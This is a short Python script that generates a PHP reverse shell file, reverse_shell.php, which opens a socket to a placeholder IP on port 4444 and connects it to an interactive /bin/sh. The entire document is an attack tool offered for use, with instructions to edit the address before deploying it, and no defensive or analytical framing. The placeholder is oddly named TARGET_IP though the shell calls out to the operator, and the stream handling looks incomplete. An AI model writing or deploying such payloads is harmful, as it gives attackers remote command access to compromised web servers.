import os

def generate_php_shell():
    php_content = """<?php
// Reverse Shell Payload
$ip = 'TARGET_IP';
$port = 4444;
$cmd = '/bin/sh -i';
$p = popen($cmd, 'r');
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if ($errno > 0) {
    die($errstr);
}
stream_copy_to_stream($sock, $p);
stream_copy_to_stream($p, $sock);
fclose($sock);
pclose($p);
?>"""
    # Replace placeholders with actual target details (User must edit before use)
    # For a dynamic version, you would pass IP as an argument, but here is the raw template.
    with open('reverse_shell.php', 'w') as f:
        f.write(php_content)
    print("[+] reverse_shell.php generated. Edit IP and Port inside the file.")

if __name__ == "__main__":
    generate_php_shell()
